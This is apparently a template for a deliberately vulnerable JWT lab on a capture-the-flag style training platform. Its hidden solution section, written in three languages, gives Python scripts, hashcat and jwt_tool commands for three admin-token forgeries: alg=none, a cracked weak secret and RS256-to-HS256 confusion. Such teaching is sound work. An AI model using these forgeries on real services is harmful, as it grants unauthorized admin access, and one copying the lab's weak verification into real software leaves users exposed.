@@ -1,0 +1,222 @@
+{% extends "base.html" %}
+{% block title %}V11 – JWT Manipulation – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <!-- Generate token -->
+  <div class="hl-card mb-4">
+    <div class="text-xs font-semibold uppercase tracking-wider mb-4" style="color:var(--hl-primary)">
+      <i class="ph ph-key text-sm"></i> <span data-i18n="jwt_generate">Generar Token</span>
+    </div>
+    <form method="POST" action="/jwt" class="space-y-3">
+      <input type="hidden" name="action" value="generate" />
+      <div class="grid grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_username">Usuario</label>
+          <input type="text" name="username" value="guest" class="hl-input" />
+        </div>
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="col_role">Rol</label>
+          <input type="text" name="role" value="user" class="hl-input" />
+        </div>
+      </div>
+      <button type="submit" class="btn-primary">
+        <i class="ph ph-seal text-sm"></i> <span data-i18n="jwt_btn_gen">Generar JWT</span>
+      </button>
+    </form>
+    {% if token %}
+    <div class="mt-4 p-3 rounded-lg border text-xs font-mono break-all bg-dark-900 border-gray-700" style="color:var(--hl-primary)">
+      {{ token }}
+    </div>
+    <div class="text-xs text-gray-500 mt-2"><span data-i18n="jwt_secret_used">Secreto usado:</span> <code class="text-yellow-400">{{ secret }}</code></div>
+    {% endif %}
+  </div>
+
+  <!-- Verify token -->
+  <div class="hl-card mb-4">
+    <div class="text-xs font-semibold uppercase tracking-wider mb-4" style="color:var(--hl-primary)">
+      <i class="ph ph-shield-check text-sm"></i> <span data-i18n="jwt_verify">Verificar / Manipular Token</span>
+    </div>
+    <form method="POST" action="/jwt" class="space-y-3">
+      <input type="hidden" name="action" value="verify" />
+      <div>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_jwt_token">Token JWT</label>
+        <input type="text" name="token" placeholder="header.payload.signature"
+               class="hl-input font-mono" value="{{ token or '' }}" />
+      </div>
+      <button type="submit" class="btn-primary">
+        <i class="ph ph-magnifying-glass text-sm"></i> <span data-i18n="jwt_btn_verify">Verificar</span>
+      </button>
+    </form>
+
+    {% if decoded %}
+    <div class="mt-4 p-3 rounded-lg border bg-dark-900 border-gray-700">
+      <div class="text-xs text-gray-400 mb-2 font-medium" data-i18n="jwt_decoded">Payload decodificado</div>
+      <pre class="text-green-400 text-xs">{{ decoded | tojson(indent=2) }}</pre>
+      {% if decoded._vuln is defined %}
+      <div class="mt-2 text-xs text-red-400 font-semibold">
+        <i class="ph ph-warning-circle"></i> {{ decoded._vuln }}
+      </div>
+      {% endif %}
+    </div>
+    {% endif %}
+    {% if error %}
+    <div class="mt-3 alert-error text-xs">{{ error }}</div>
+    {% endif %}
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Bypass alg=none</h3>
+    <ol>
+      <li>Genera un token legítimo con usuario "guest" desde el formulario.</li>
+      <li>Decodifica el header (base64url), cambia <code>"alg":"HS256"</code> a <code>"alg":"none"</code>.</li>
+      <li>Modifica el payload: cambia <code>"role":"user"</code> a <code>"role":"admin"</code>.</li>
+      <li>Construye el token con firma vacía (<code>HEADER.PAYLOAD.</code>) con Python:
+        <pre>import base64, json
+def b64url(data):
+    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()
+h = b64url({"alg":"none","typ":"JWT"})
+p = b64url({"sub":"admin","role":"admin","iat":1700000000})
+print(f"{h}.{p}.")</pre></li>
+      <li>Envía el token al verificador. El servidor lo acepta sin verificar la firma.</li>
+    </ol>
+    <h3>Medium — Fuerza bruta del secreto debil</h3>
+    <ol>
+      <li>El secreto es corto. Usa hashcat para crackear la firma HS256:
+        <pre>hashcat -a 0 -m 16500 'TOKEN_AQUI' /usr/share/wordlists/rockyou.txt</pre></li>
+      <li>O verifica manualmente con Python:
+        <pre>import hmac, hashlib, base64
+secret = 'secret'  # prueba palabras comunes
+h, p, s = 'TOKEN'.split('.')
+sig = base64.urlsafe_b64encode(
+    hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
+).rstrip(b'=').decode()
+print('Match!' if sig == s else 'No match')</pre></li>
+      <li>El secreto es <code>secret</code> (visible en la interfaz Easy). Con el secreto conocido, forja un token admin con firma valida usando jwt_tool:
+        <pre>python3 jwt_tool.py TOKEN -T -S hs256 -p 'secret'</pre></li>
+    </ol>
+    <h3>Hard — Algorithm confusion (RS256 a HS256 con clave publica)</h3>
+    <ol>
+      <li>Obtén la clave publica del servidor desde <code>/jwt/jwks</code> (campo <code>n</code> del JWK).</li>
+      <li>El servidor acepta tokens HS256 firmados con esa clave publica como secreto HMAC.</li>
+      <li>Genera el token de confusion con Python:
+        <pre>import hmac, hashlib, base64, json
+pub_key = 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0...'  # del /jwt/jwks
+def b64url(d):
+    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
+h = b64url({"alg":"HS256","typ":"JWT"})
+p = b64url({"sub":"admin","role":"admin","iat":1700000000})
+sig = base64.urlsafe_b64encode(
+    hmac.new(pub_key.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
+).rstrip(b'=').decode()
+print(f'{h}.{p}.{sig}')</pre></li>
+      <li>Envía el token forjado al verificador. Flag dedicada: <code>HL{···}</code></li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">jwt_tool</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">python3</span> <span class="tools-badge">Burp Suite</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — alg=none bypass</h3>
+    <ol>
+      <li>Generate a legitimate token with user "guest" from the form.</li>
+      <li>Base64url-decode the header, change <code>"alg":"HS256"</code> to <code>"alg":"none"</code>.</li>
+      <li>Modify the payload: change <code>"role":"user"</code> to <code>"role":"admin"</code>.</li>
+      <li>Build the token with an empty signature (<code>HEADER.PAYLOAD.</code>) using Python:
+        <pre>import base64, json
+def b64url(data):
+    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()
+h = b64url({"alg":"none","typ":"JWT"})
+p = b64url({"sub":"admin","role":"admin","iat":1700000000})
+print(f"{h}.{p}.")</pre></li>
+      <li>Send the token to the verifier. The server accepts it without checking the signature.</li>
+    </ol>
+    <h3>Medium — Brute force weak secret</h3>
+    <ol>
+      <li>The secret is short. Use hashcat to crack the HS256 signature:
+        <pre>hashcat -a 0 -m 16500 'TOKEN_HERE' /usr/share/wordlists/rockyou.txt</pre></li>
+      <li>Or verify manually with Python:
+        <pre>import hmac, hashlib, base64
+secret = 'secret'  # try common words
+h, p, s = 'TOKEN'.split('.')
+sig = base64.urlsafe_b64encode(
+    hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
+).rstrip(b'=').decode()
+print('Match!' if sig == s else 'No match')</pre></li>
+      <li>The secret is <code>secret</code> (visible in the Easy interface). With the known secret, forge an admin token with a valid signature using jwt_tool:
+        <pre>python3 jwt_tool.py TOKEN -T -S hs256 -p 'secret'</pre></li>
+    </ol>
+    <h3>Hard — Algorithm confusion (RS256 to HS256 with public key)</h3>
+    <ol>
+      <li>Get the public key from the server at <code>/jwt/jwks</code> (field <code>n</code> of the JWK).</li>
+      <li>The server accepts HS256 tokens signed with that public key as the HMAC secret.</li>
+      <li>Generate the confusion token with Python:
+        <pre>import hmac, hashlib, base64, json
+pub_key = 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0...'  # from /jwt/jwks
+def b64url(d):
+    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
+h = b64url({"alg":"HS256","typ":"JWT"})
+p = b64url({"sub":"admin","role":"admin","iat":1700000000})
+sig = base64.urlsafe_b64encode(
+    hmac.new(pub_key.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
+).rstrip(b'=').decode()
+print(f'{h}.{p}.{sig}')</pre></li>
+      <li>Send the forged token to the verifier. Dedicated flag: <code>HL{···}</code></li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">jwt_tool</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">python3</span> <span class="tools-badge">Burp Suite</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Fácil — Bypass com alg=none</h3>
+    <ol>
+      <li>Gere um token legítimo com o usuário "guest" a partir do formulário.</li>
+      <li>Decodifique o cabeçalho em base64url e altere <code>"alg":"HS256"</code> para <code>"alg":"none"</code>.</li>
+      <li>Modifique o payload: altere <code>"role":"user"</code> para <code>"role":"admin"</code>.</li>
+      <li>Monte o token com assinatura vazia (<code>HEADER.PAYLOAD.</code>) usando Python:
+        <pre>import base64, json
+def b64url(data):
+    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()
+h = b64url({"alg":"none","typ":"JWT"})
+p = b64url({"sub":"admin","role":"admin","iat":1700000000})
+print(f"{h}.{p}.")</pre></li>
+      <li>Envie o token para o verificador. O servidor o aceita sem validar a assinatura.</li>
+    </ol>
+    <h3>Médio — Força bruta em segredo fraco</h3>
+    <ol>
+      <li>O segredo é curto. Use o hashcat para quebrar a assinatura HS256:
+        <pre>hashcat -a 0 -m 16500 'TOKEN_HERE' /usr/share/wordlists/rockyou.txt</pre></li>
+      <li>Ou valide manualmente com Python:
+        <pre>import hmac, hashlib, base64
+secret = 'secret'  # try common words
+h, p, s = 'TOKEN'.split('.')
+sig = base64.urlsafe_b64encode(
+    hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
+).rstrip(b'=').decode()
+print('Match!' if sig == s else 'No match')</pre></li>
+      <li>O segredo é <code>secret</code> (visível na interface do modo Fácil). Com o segredo conhecido, forje um token de admin com assinatura válida usando o jwt_tool:
+        <pre>python3 jwt_tool.py TOKEN -T -S hs256 -p 'secret'</pre></li>
+    </ol>
+    <h3>Difícil — Confusão de algoritmo (RS256 para HS256 com chave pública)</h3>
+    <ol>
+      <li>Obtenha a chave pública no servidor em <code>/jwt/jwks</code> (campo <code>n</code> do JWK).</li>
+      <li>O servidor aceita tokens HS256 assinados com essa chave pública atuando como o segredo HMAC.</li>
+      <li>Gere o token da confusão de algoritmo com Python:
+        <pre>import hmac, hashlib, base64, json
+pub_key = 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0...'  # from /jwt/jwks
+def b64url(d):
+    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
+h = b64url({"alg":"HS256","typ":"JWT"})
+p = b64url({"sub":"admin","role":"admin","iat":1700000000})
+sig = base64.urlsafe_b64encode(
+    hmac.new(pub_key.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
+).rstrip(b'=').decode()
+print(f'{h}.{p}.{sig}')</pre></li>
+      <li>Envie o token forjado para o verificador. Flag dedicada: <code>HL{···}</code></li>
+    </ol>
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">jwt_tool</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">python3</span> <span class="tools-badge">Burp Suite</span></div>
+  </div>
+</div>
+{% endblock %}
